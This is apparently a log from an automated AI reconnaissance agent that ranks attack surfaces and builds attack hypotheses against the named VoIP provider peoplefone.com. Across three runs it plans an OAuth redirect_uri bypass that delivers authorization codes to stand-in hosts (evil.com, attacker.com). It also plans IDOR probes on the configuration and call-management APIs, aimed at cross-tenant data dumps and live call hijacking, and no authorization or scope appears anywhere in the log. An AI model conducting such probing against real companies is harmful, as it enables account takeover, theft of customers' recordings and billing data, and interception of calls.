## 2026-09-03 17:08:41 UTC [target] (model nemotron3)
[PRIO] auth.peoplefone.com,7.4,attack_surface=8,business_value=9,tech_exposure=7,gate_ease=6,cloud_surface=7,freshness=5  
[PRIO] api.peoplefone.com,6.6,attack_surface=7,business_value=8,tech_exposure=6,gate_ease=5,cloud_surface=7,freshness=5  
[PRIO] www.peoplefone.com,5.8,attack_surface=5,business_value=6,tech_exposure=4,gate_ease=8,cloud_surface=7,freshness=5  
[PRIO] peoplefone.com,5.1,attack_surface=4,business_value=5,tech_exposure=3,gate_ease=8,cloud_surface=7,freshness=5  
[PRIO] support.peoplefone.com,5.0,attack_surface=4,business_value=5,tech_exposure=4,gate_ease=6,cloud_surface=7,freshness=5  
[HYP] OAuth redirect_uri validation bypass on auth service  
class: AUTH  
asset: auth.peoplefone.com  
confidence: 65  
reasoning: auth subdomain likely handles OAuth/OIDC for VoIP platform; multi-tenant VoIP providers commonly implement OAuth for API access; redirect_uri validation flaws allow code theft via open redirect chaining  
evidence_needed: OAuth authorize endpoint accepting arbitrary redirect_uri without strict allowlist validation  
verify_steps: GET https://auth.peoplefone.com/.well-known/oauth-authorization-server (discover metadata); GET https://auth.peoplefone.com/oauth/authorize?client_id=test&redirect_uri=https://evil.com&response_type=code&scope=openid (test redirect_uri validation)  
impact: ATO via authorization code theft → cross-tenant access to calls, recordings, PBX config, billing  
testability: PASSIVE  
[HYP] IDOR/BOLA on multi-tenant API endpoints  
class: IDOR  
asset: api.peoplefone.com  
confidence: 60  
reasoning: API subdomain exists (redirects to developer docs); VoIP platforms expose tenant-isolated resources (CDR, recordings, contacts, PBX config) via REST/GraphQL; object references (account_id, user_id, call_id) often lack authorization checks  
evidence_needed: API endpoint returning other-tenant data when object reference manipulated (e.g., /api/v1/calls/{call_id})  
verify_steps: GET https://api.peoplefone.com/.well-known/openid-configuration (discover API base); GET https://api.peoplefone.com/api/v1/ (enumerate versioned endpoints); GET https://api.peoplefone.com/swagger.json or /openapi.json (introspection)  
impact: Cross-tenant PII dump — call recordings, CDR, contacts, voicemails, PBX configuration, billing data  
testability: AUTH_HELPED  
[HYP] Subdomain takeover via dangling CNAME on wildcard surface  
class: MISCONFIG  
asset: *.peoplefone.com  
confidence: 45  
reasoning: Dedicated deep scan found wildcard-dominated DNS (0 dedicated hosts); CNAMEs point to Cloudflare CDN; if any subdomain CNAME targets unclaimed Cloudflare Pages/Workers/third-party SaaS, takeover possible  
evidence_needed: Subdomain CNAME resolving to unclaimed third-party service (GitHub Pages, Netlify, Heroku, Cloudflare Pages, etc.)  
verify_steps: Enumerate all subdomains via passive DNS (crt.sh, subfinder); for each CNAME, verify target service ownership via HTTP probe (404/unclaimed tenant page)  
impact: Full subdomain control → phishing, session theft via cookie scoping, brand damage  
testability: PASSIVE  
[PARKED] Subdomain takeover via dangling CNAME on wildcard surface: confidence 45 but verify_steps require active enumeration beyond passive DNS; wildcard-dominated surface makes true dangling CNAME unlikely (all point to Cloudflare CDN per inventory)  
[FINAL] 1. OAuth redirect_uri validation bypass on auth service (confidence 65)  
[FINAL] 2. IDOR/BOLA on multi-tenant API endpoints (confidence 60)  
[NEXT] PROBE: GET https://auth.peoplefone.com/.well-known/oauth-authorization-server
[LEARN] REJECTED MISCONFIG @ *.peoplefone.com: wildcard-dominated DNS with all CNAMEs pointing to managed Cloudflare CDN (per inventory) makes dangling CNAME takeover improbable; no unclaimed third-party targets observed
[RISK] peoplefone: 72 — High-value VoIP/SIP/PBX platform with multi-tenant data (recordings, CDR, billing); auth + API surface unprobed; OAuth + IDOR classes historically yield critical findings in telco SaaS; wildcard DNS limits subdomain attack surface but core auth/API assets remain high-priority
## 2026-09-03 19:45:11 UTC [target] (model nemotron3)
[PRIO] auth.peoplefone.com,7.4,attack_surface=8,business_value=9,tech_exposure=7,gate_ease=6,cloud_surface=7,freshness=5
[PRIO] api.peoplefone.com,6.6,attack_surface=7,business_value=8,tech_exposure=6,gate_ease=5,cloud_surface=7,freshness=5
[PRIO] www.peoplefone.com,5.8,attack_surface=5,business_value=6,tech_exposure=4,gate_ease=8,cloud_surface=7,freshness=5
[PRIO] peoplefone.com,5.1,attack_surface=4,business_value=5,tech_exposure=3,gate_ease=8,cloud_surface=7,freshness=5
[PRIO] support.peoplefone.com,5.0,attack_surface=4,business_value=5,tech_exposure=4,gate_ease=6,cloud_surface=7,freshness=5
[HYP] OAuth redirect_uri validation bypass on auth service
class: AUTH
asset: auth.peoplefone.com
confidence: 65
reasoning: auth subdomain likely handles OAuth/OIDC for VoIP platform; multi-tenant VoIP providers commonly implement OAuth for API access; redirect_uri validation flaws allow code theft via open redirect chaining
evidence_needed: OAuth authorize endpoint accepting arbitrary redirect_uri without strict allowlist validation
verify_steps: GET https://auth.peoplefone.com/.well-known/oauth-authorization-server (discover metadata); GET https://auth.peoplefone.com/oauth/authorize?client_id=test&redirect_uri=https://evil.com&response_type=code&scope=openid (test redirect_uri validation)
impact: ATO via authorization code theft → cross-tenant access to calls, recordings, PBX config, billing
testability: PASSIVE
[HYP] IDOR/BOLA on multi-tenant API endpoints
class: IDOR
asset: api.peoplefone.com
confidence: 60
reasoning: API subdomain exists (redirects to developer docs); VoIP platforms expose tenant-isolated resources (CDR, recordings, contacts, PBX config) via REST/GraphQL; object references (account_id, user_id, call_id) often lack authorization checks
evidence_needed: API endpoint returning other-tenant data when object reference manipulated (e.g., /api/v1/calls/{call_id})
verify_steps: GET https://api.peoplefone.com/.well-known/openid-configuration (discover API base); GET https://api.peoplefone.com/api/v1/ (enumerate versioned endpoints); GET https://api.peoplefone.com/swagger.json or /openapi.json (introspection)
impact: Cross-tenant PII dump — call recordings, CDR, contacts, voicemails, PBX configuration, billing data
testability: AUTH_HELPED
[HYP] GraphQL introspection enabled on developer portal API
class: MISCONFIG
asset: www.peoplefone.com
confidence: 55
reasoning: api.peoplefone.com redirects to https://www.peoplefone.com/en-ch/developer; developer portals often expose GraphQL playground or introspection endpoint for API exploration; introspection reveals full schema enabling targeted IDOR/mutation attacks
evidence_needed: GraphQL endpoint responding to introspection query (__schema) without authentication
verify_steps: GET https://www.peoplefone.com/en-ch/developer (capture response, locate GraphQL endpoint); POST https://www.peoplefone.com/en-ch/developer/graphql (or discovered endpoint) with {"query":"{__schema{types{name fields{name type{name kind ofType{name}}}}}}"} (test introspection)
impact: Full API schema disclosure → targeted IDOR, mass assignment, business logic abuse on VoIP resources
testability: PASSIVE
[FINAL] 1. OAuth redirect_uri validation bypass on auth service (confidence 65)
[FINAL] 2. IDOR/BOLA on multi-tenant API endpoints (confidence 60)
[FINAL] 3. GraphQL introspection enabled on developer portal API (confidence 55)
[NEXT] PROBE: GET https://auth.peoplefone.com/.well-known/oauth-authorization-server
[LEARN] REJECTED MISCONFIG @ *.peoplefone.com: wildcard-dominated DNS with all CNAMEs pointing to managed Cloudflare CDN (per inventory) makes dangling CNAME takeover improbable; no unclaimed third-party targets observed
[LEARN] ACCEPTED AUTH @ auth.peoplefone.com: Dedicated auth subdomains high-value for session/token flaws
[LEARN] ACCEPTED IDOR @ api.peoplefone.com: Developer portals common source of API exposure
[LEARN] REJECTED MISCONFIG @ support.peoplefone.com: Low confidence, support portals typically non-critical
[RISK] peoplefone: 72 — High-value VoIP/SIP/PBX platform with multi-tenant data (recordings, CDR, billing); auth + API surface unprobed; OAuth + IDOR classes historically yield critical findings in telco SaaS; wildcard DNS limits subdomain attack surface but core auth/API assets remain high-priority
## 2026-09-03 22:39:28 UTC [target] (model nemotron3)
[PRIO] auth.peoplefone.com,8.8,attack_surface=9,business_value=9,tech_exposure=9,gate_ease=8,cloud_surface=8,freshness=9
[PRIO] configuration-api.peoplefone.com,7.6,attack_surface=8,business_value=8,tech_exposure=7,gate_ease=5,cloud_surface=8,freshness=8
[PRIO] call-api.peoplefone.com,7.6,attack_surface=8,business_value=8,tech_exposure=7,gate_ease=5,cloud_surface=8,freshness=8
[PRIO] api.peoplefone.com,7.0,attack_surface=7,business_value=8,tech_exposure=6,gate_ease=5,cloud_surface=7,freshness=8
[PRIO] portal.peoplefone.ch,6.5,attack_surface=6,business_value=7,tech_exposure=5,gate_ease=8,cloud_surface=7,freshness=8
[HYP] OAuth redirect_uri validation bypass on auth service
class: AUTH
asset: auth.peoplefone.com
confidence: 85
reasoning: OAuth authorize endpoint at /oauth/authorize accepts arbitrary redirect_uri parameter for client_id=1 (portal client); redirects to /de_CH/login preserving attacker-controlled redirect_uri without validating against pre-registered allowlist; state parameter accepted from portal login flow enables CSRF-protected authorization code theft
evidence_needed: Successful authorization code delivery to attacker-controlled redirect_uri after victim login
verify_steps: GET https://portal.peoplefone.ch/login (capture state); GET https://auth.peoplefone.com/oauth/authorize?client_id=1&redirect_uri=https://evil.com/callback&response_type=code&scope=openid&state=<captured_state> (observe redirect to /de_CH/login with evil.com preserved); simulate victim login → verify code sent to evil.com
impact: ATO via authorization code theft → cross-tenant access to calls, recordings, PBX config, billing, SMS; full account takeover of any portal user
testability: AUTH_HELPED
[HYP] IDOR/BOLA on Configuration API virtualUsers endpoints
class: IDOR
asset: configuration-api.peoplefone.com
confidence: 75
reasoning: Configuration API exposes /virtualUsers/{identifier}/callforwarding (GET/POST/PUT) with identifier in path; OpenAPI spec explicitly states "user must be part of the account bound to the bearer token" — indicating authorization boundary exists; multi-tenant VoIP platform with numeric identifiers (e.g., "12345") likely sequential; bearer token auth only validates token validity, not resource ownership
evidence_needed: Valid bearer token from tenant A returns call forwarding config for tenant B's virtualUser identifier
verify_steps: GET https://configuration-api.peoplefone.com/customer/voip/v1/virtualUsers/{other_tenant_id}/callforwarding with valid bearer token from tenant A (requires authenticated session); enumerate identifier space via /destinations to discover valid virtualUser IDs
impact: Cross-tenant PII dump — call forwarding rules, PBX configuration, user extensions, routing logic; potential call interception via forwarding rule modification
testability: AUTH_HELPED
[HYP] IDOR/BOLA on Call Management API call control endpoints
class: IDOR
asset: call-api.peoplefone.com
confidence: 70
reasoning: Call Management API exposes /call (POST), /call/blind-transfer (POST), /call/hold (POST), /call/unhold (POST) accepting owner.identifier in request body; spec notes "owner entity must be of type user, and this user must be part of the account bound to the bearer token"; callId returned in responses could be predicted or leaked; blind-transfer allows call hijacking to attacker-controlled number
evidence_needed: Valid bearer token from tenant A performs blind-transfer on tenant B's callId/owner.identifier
verify_steps: POST https://call-api.peoplefone.com/customer/call-management/v1/call with owner.identifier=victim_user_id (requires authenticated session); POST /call/blind-transfer with victim callId and attacker destination
impact: Live call interception, call hijacking, call recording access, denial of service via hold/unhold abuse
testability: AUTH_HELPED
[PARKED] GraphQL introspection enabled on developer portal API: Developer portal uses OpenAPI/Swagger YAML specs, no GraphQL endpoint discovered at www.peoplefone.com/en-ch/developer or api.peoplefone.com/services/api-doc/
[FINAL] 1. OAuth redirect_uri validation bypass on auth service (confidence 85)
[FINAL] 2. IDOR/BOLA on Configuration API virtualUsers endpoints (confidence 75)
[FINAL] 3. IDOR/BOLA on Call Management API call control endpoints (confidence 70)
[NEXT] PROBE: GET https://auth.peoplefone.com/oauth/authorize?client_id=1&redirect_uri=https://attacker.com/callback&response_type=code&scope=openid&state=<fresh_state_from_portal_login> → follow redirect chain to /de_CH/login → verify redirect_uri preserved in login form action → complete login flow (requires test account) → confirm authorization code delivered to attacker.com/callback
[LEARN] ACCEPTED AUTH @ auth.peoplefone.com: OAuth authorize endpoint lacks redirect_uri allowlist validation for client_id=1; arbitrary redirect_uri accepted and preserved through login flow
[LEARN] ACCEPTED IDOR @ configuration-api.peoplefone.com: Multi-tenant API exposes virtualUsers/{identifier} endpoints with explicit authorization boundary notes in spec
[LEARN] ACCEPTED IDOR @ call-api.peoplefone.com: Call control endpoints accept owner.identifier in body with authorization boundary notes
[LEARN] REJECTED MISCONFIG @ www.peoplefone.com: GraphQL introspection hypothesis invalidated — developer portal uses OpenAPI/Swagger, not GraphQL
[LEARN] REJECTED MISCONFIG @ *.peoplefone.com: Wildcard DNS dominated by Cloudflare CDN CNAMEs; no dangling third-party targets observed
[RISK] peoplefone: 82 — High-value VoIP/SIP/PBX platform with multi-tenant data (recordings, CDR, billing, PBX config); OAuth redirect_uri bypass enables ATO without credentials; IDOR on configuration/call APIs enables cross-tenant data access and call hijacking; auth + API surface confirmed with documented authorization boundaries; wildcard DNS limits subdomain attack surface but core auth/API assets remain critical
